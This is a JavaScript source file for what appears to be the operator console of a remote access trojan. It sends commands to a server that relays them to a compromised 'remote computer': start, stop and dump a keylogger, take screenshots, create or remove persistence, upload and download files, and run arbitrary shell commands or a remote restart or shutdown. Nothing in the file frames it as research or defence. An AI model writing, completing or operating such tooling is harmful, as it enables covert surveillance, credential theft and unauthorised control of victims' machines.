"use strict";

var rested = false;
var indexer = null;
var lastCmdEnter = null;
var isLastCmdSet = false;
var cmdProcessing = false;

var inputHistoryCMD = [];
var inputHistorySSH = [];

var commands = { 
    "status": { "id": 1, "help": "Check the status of a file transfer", "usage": "status" },
    "reconnect": { "id": 2, "help": "Force the remote computer to reconnect", "usage": "reconnect" },
    "disconnect": { "id": 7, "help": "Force the remote computer to disconnect", "usage": "disconnect" },
    "screenshot": { "id": 5, "help": "Capture a screenshot", "usage": "\t\tscreenshot" },
    "logger_dump": { "id": 14, "help": "Display keystrokes", "usage": "\t\tlogger_dump" },
    "logger_stop": { "id": 13, "help": "Stop keylogging", "usage": "\t\t\tlogger_stop" },
    "logger_start": { "id": 12, "help": "Start keylogging", "usage": "\t\t\tlogger_start" },
    "upload": { "id": 3, "help": "Upload a file to the remote computer", "usage": "upload <file>" },
    "persist_create": { "id": 8, "help": "Create persistence", "usage": "\t\t\tpersist_create" },
    "persist_remove": { "id": 9, "help": "Remove persistence", "usage": "\t\t\tpersist_remove" },
    "download": { "id": 4, "help": "Downaload a file from the remote computer", "usage": "download <file>" },
    "chrome": { "id": 6, "help": "Launch Chrome browser", "usage": "\t\t\tchrome <tab1> <tab2> <tabn>" },
}

$(document).ready(function() {
    cmdSrc();   
});

function resetValues() {
    indexer = null;
    lastCmdEnter = null;
    isLastCmdSet = false;
    cmdProcessing = false;
}

function getBeforeLastValue(id) {
    let e = document.getElementById(id);
    let value = "";

    for(let n=0; n<e.value.length-1; n++) {
        value += e.value[n];
    }
    return value;
}

function getArgs(cmd) {
    let args = [];

    for(let n=1; n<cmd.length; n++) {
        args[n-1] = cmd[n];
    }
    return args;
}

function upArrow(input_id, inputHistory) {
    let input = document.getElementById(input_id);
    if(inputHistory.length && indexer > 0) {
        indexer -= 1;
        input.value = inputHistory[indexer];
    } else if (inputHistory.length) {
        if(typeof input.selectionStart == "number") {
            input.selectionStart = input.selectionEnd = input.value.length;
        } else if (typeof input.createTextRange != "undefined") {
            input.focus();
            var range = input.createTextRange();
            range.collapse(false);
            range.select();
        } 
    }
}

function downArrow(input_id, inputHistory) {
    let input = document.getElementById(input_id);
    if(inputHistory.length && indexer < inputHistory.length-1) {
        indexer += 1;
        input.value = inputHistory[indexer];
    } else if(inputHistory.length && indexer == inputHistory.length-1) {
        indexer = inputHistory.length;
        input.value = lastCmdEnter;
    }
}

function consoleExecute() {
    let input = document.getElementById("console");
    let display = document.getElementById("cmd-line");
    let cmd = input.value.trim();

    if(cmdProcessing) {
        return;
    }

    if(cmd.length) {

        input.value = "";
        let cmdOutput = "";
        cmdProcessing = true;
        isLastCmdSet = false;
        let cmdLine = "$> " + cmd;
        let currentDisplay = display.innerText;         
        let cls = (cmd == "cls" || cmd == "clear") ? true : false;

        if((inputHistoryCMD.includes(cmd))) {
           inputHistoryCMD.splice(inputHistoryCMD.indexOf(cmd), 1);  
        } 

        inputHistoryCMD[inputHistoryCMD.length] = cmd;
        indexer = inputHistoryCMD.length;

        if(cls) {
            cmdProcessing = false;
            display.innerHTML = "";
        } else if(cmd == "help") {
            cmdOutput = "cls - clear screen\nclear - clear screen\n" + "help - display help menu\n" + 
                        "commands - display commands"                    

            let newDisplay = currentDisplay + "\n" + cmdLine + "\n" + cmdOutput + "\n";

            cmdProcessing = false;
            display.innerText = newDisplay;
            display.scrollTop = display.scrollHeight;
        } else if(cmd == "commands") {
            let displayed = false;
            let cmdOutput = "";

            for(let cmd in commands) {
                if(!displayed) {
                    displayed = true;
                    cmdOutput += "\t#--------[ Available Commands ]--------#\n\n";
                }
                let command = commands[cmd];
                cmdOutput += "\t" + cmd + "\t".repeat(cmd.length < 8 ? 2:1) 
                          + command["help"] + "\t".repeat(command["usage"].length < 15 ? 2:1) + command["usage"] + "\n";
            }

            cmdOutput += "\n\tOver-ride a running upload or download process by using --override after the args\n" +
                         "\tExample: download blueprint.pdf --override\n"
            let newDisplay = currentDisplay + "\n" + cmdLine + "\n" + cmdOutput + "\n";
            
            cmdProcessing = false;
            display.innerText = newDisplay;
            display.scrollTop = display.scrollHeight;

        } else {
            if(!(cmd.split(" ")[0] in commands)) {
                let cmdOutput = "";
                let newDisplay = currentDisplay + "\n" + cmdLine + "\n" + cmdOutput + "\n";

                cmdProcessing = false;
                display.innerText = newDisplay;
                display.scrollTop = display.scrollHeight;
                return;
            }

            let loading = document.getElementById("console-load");
            loading.style.display = "block";
            input.style.display = "none";

            let _cmd = cmd.split(" ");
            let cmd_id = commands[_cmd[0]]['id'];
            let args = _cmd.length > 1 ? getArgs(_cmd) : [-1]; // an empty array won't be sent

            $.ajax({
                type: "POST",
                url: "/control/cmd/cmd",
                data: { "cmd_id": cmd_id, "args": args }
            }).done(function(data) {
                let cmdOutput = '\n' + data["resp"];
                let newDisplay = currentDisplay + "\n" + cmdLine + "\n" + cmdOutput;

                display.innerText = newDisplay + "\n";
                display.scrollTop = display.scrollHeight;               

                loading.style.display = "none";
                input.style.display = "block";
                cmdProcessing = false;
                input.focus();
            });
        }
    }        
}

function executeCmd() {
    let input = document.getElementById("cmd-input");
    let display = document.getElementById("cmd-line");
    let cmd = input.value.trim();

    if(cmdProcessing) {
        return;
    }

    if(cmd.length) {
        input.value = "";
        let cmdOutput = "";
        cmdProcessing = true;
        isLastCmdSet = false;
        let cmdLine = "$> " + cmd;
        let currentDisplay = display.innerText; 
        let cls = (cmd == "cls" || cmd == "clear") ? true : false;

        if((inputHistorySSH.includes(cmd))) {
           inputHistorySSH.splice(inputHistorySSH.indexOf(cmd), 1);  
        } 
        
        inputHistorySSH[inputHistorySSH.length] = cmd;
        indexer = inputHistorySSH.length;
 
        cmd = cmd == "restart" ? "shutdown -r" : cmd == "shutdown" ? "shutdown -s" : cmd;

        if(cls) {
            cmdProcessing = false;
            display.innerHTML = "";
        } else if(cmd == "menu") {
            cmdOutput = "cls - clear screen\nclear - clear screen\n" + "help - display help menu\n" +
                        "type <filename> - read a file\n" + "restart - restart remote computer\n" +
                        "shutdown - shutdown remote computer\n" + "systeminfo - display system information"

            let newDisplay = currentDisplay + "\n" + cmdLine + "\n" + cmdOutput + "\n";
            cmdProcessing = false;
            display.innerText = newDisplay;
            display.scrollTop = display.scrollHeight;
        } else {

            let loading = document.getElementById("cmd-load");
            loading.style.display = "block";
            input.style.display = "none";

            $.ajax({
                type: "POST",
                data: { "cmd": cmd },
                url: "/control/ssh/exe"
            }).done(function(data) {
                let cmdOutput = data["resp"];
                let newDisplay = currentDisplay + "\n" + cmdLine + "\n" + cmdOutput;

                display.innerText = newDisplay + "\n";
                display.scrollTop = display.scrollHeight;               

                loading.style.display = "none";
                input.style.display = "block";
                cmdProcessing = false;
                input.focus();
            });
        }
    }        
}

function cmdSrc() {
    $.ajax({
        type: "POST",
        url: "/control/cmd/src"
    }).done(function(data) {
        let display = document.getElementById("display");
        let html = data["resp"];
        if(html) {
            rested = false;
            display.innerHTML = html; 
            indexer = inputHistoryCMD.length;
            document.getElementById("console").addEventListener("keyup", function(e) {
                if(e.which == 13) {
                    if(!rested) {
                        resetValues();
                        rested = true;
                    }
                    consoleExecute();           
                } else if(e.which == 38) {
                    if(!isLastCmdSet) {
                        isLastCmdSet = true;
                        lastCmdEnter = document.getElementById("console").value;
                    }
                    upArrow("console", inputHistoryCMD);
                } else if(e.which == 40) {
                    if(!isLastCmdSet) {
                        isLastCmdSet = true;
                        lastCmdEnter = document.getElementById("console").value;
                    }
                    downArrow("console", inputHistoryCMD);
                } else {
                    if(getBeforeLastValue("console") == lastCmdEnter) {
                        isLastCmdSet = false;
                    }
                }
            });    
        }
    });
}

function sshSrc() {
    $.ajax({
        type: "POST",
        url: "/control/ssh/src"
    }).done(function(data) {
        let display = document.getElementById("display");
        let html = data["resp"];
        if(html) {
            rested = false;
            display.innerHTML = html;     
            indexer = inputHistorySSH.length;
            document.getElementById("cmd-input").addEventListener("keyup", function(e) {
                if(e.which == 13) {
                    if(!rested) {
                        resetValues();
                        rested = true;
                    }
                    executeCmd();           
                } else if(e.which == 38) {
                    if(!isLastCmdSet) {
                        isLastCmdSet = true;
                        lastCmdEnter = document.getElementById("cmd-input").value;
                    }
                    upArrow("cmd-input", inputHistorySSH);
                } else if(e.which == 40) {
                    if(!isLastCmdSet) {
                        isLastCmdSet = true;
                        lastCmdEnter = document.getElementById("cmd-input").value;
                    }
                    downArrow("cmd-input", inputHistorySSH);
                } else {
                    if(getBeforeLastValue("cmd-input") == lastCmdEnter) {
                        isLastCmdSet = false;
                    }
                }
            });
        }
    });
}